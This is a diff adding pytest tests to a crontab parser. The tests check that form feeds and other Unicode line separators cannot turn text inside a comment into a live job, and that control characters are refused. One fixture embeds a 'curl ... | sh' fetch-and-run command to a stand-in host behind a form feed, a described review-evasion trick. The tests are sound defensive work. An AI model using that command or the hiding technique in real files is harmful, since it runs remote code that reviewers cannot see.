@@ -334,3 +334,71 @@ def test_h_schedules_parse_with_the_line_derived_name(tmp_path):
     assert jobs[0]["name"] == "legacy.crontab:1"
     assert jobs[0]["schedule"] == "H * * * *"
     assert crontabs.looks_like_crontab("H 4 * * * /bin/backup") is True
+
+
+# ---------------------------------------------------------------------------
+# fuzzing findings: LF-only physical lines, and control-character refusal
+# ---------------------------------------------------------------------------
+
+
+def test_lines_are_split_on_lf_only_not_the_splitlines_family():
+    # cron is LF-delimited, but str.splitlines() also breaks on VT, FF,
+    # FS/GS/RS, NEL and U+2028/U+2029 -- so text sitting INSIDE a '#'
+    # comment (one line in every editor, cat, git diff and code review)
+    # became a live job.  FF is the classic Emacs page separator, so this
+    # was reachable without malice -- and a plausible review-evasion vector.
+    ff = chr(0x0C)
+    data = (
+        "# page one" + ff + "* * * * * curl http://evil.example/x | sh\n"
+        "0 3 * * * /usr/bin/backup\n"
+    )
+    jobs = crontabs.parse_crontab(data, "a.crontab")
+    assert len(jobs) == 1
+    assert not any("evil.example" in j["command"] for j in jobs)
+    # ...and the job's name carries its PHYSICAL line number
+    assert jobs[0]["name"] == "a.crontab:2"
+    for code in (0x0B, 0x0C, 0x1C, 0x1D, 0x1E, 0x85, 0x2028, 0x2029):
+        line = "# c" + chr(code) + "* * * * * pwned\n"
+        assert crontabs.parse_crontab(line, "t") == []
+        # the sniffer judges the same physical lines as the parser
+        assert crontabs.looks_like_crontab(line) is False
+
+
+def test_error_line_numbers_name_physical_lines():
+    ff = chr(0x0C)
+    data = "# one" + ff + "junk\n# two\nbad schedule here x y\n"
+    with pytest.raises(crontabs.CrontabError, match="c.crontab:3"):
+        crontabs.parse_crontab(data, "c.crontab")
+
+
+def test_crlf_and_lone_ff_page_separator_lines_still_parse():
+    # a CRLF crontab parses identically (one trailing CR stripped per line)
+    jobs = crontabs.parse_crontab("0 3 * * * /x\r\n", "w.crontab")
+    assert jobs[0]["command"] == "/x"
+    # a lone FF on its own line (an Emacs page separator) is just blank
+    jobs = crontabs.parse_crontab("\x0c\n0 1 * * * /y\n", "e.cron")
+    assert [j["name"] for j in jobs] == ["e.cron:2"]
+
+
+def test_control_characters_in_live_lines_are_refused_with_file_line():
+    # a NUL builds a job the launcher can never spawn (exec refuses the
+    # argument) and the resulting ValueError used to kill the scheduler;
+    # the crontab front end is the sole route to that shape, so it refuses
+    # at parse time with the physical file:line.  Mid-line FF (previously
+    # a silent command truncation) is likewise refused, not half-honoured.
+    for data in (
+        "* * * * * echo\x00hi\n",
+        "FOO=a\x00b\n* * * * * true\n",
+        "SHELL=/bin/sh\x00\n* * * * * true\n",
+        "* * * * * /usr/bin/backup --dest /vol\x0c# note\n",
+    ):
+        with pytest.raises(
+            crontabs.CrontabError, match="legacy.crontab:1"
+        ):
+            crontabs.parse_crontab(data, "legacy.crontab")
+    # config integration: the refusal surfaces as a ConfigError
+    with pytest.raises(ConfigError, match="control character"):
+        config.parse_crontab_string("* * * * * echo\x00hi\n", "l.crontab")
+    # tab remains a perfectly good field separator
+    jobs = crontabs.parse_crontab("0 3 * * *\t/usr/bin/backup\n", "t.cron")
+    assert jobs[0]["command"] == "/usr/bin/backup"
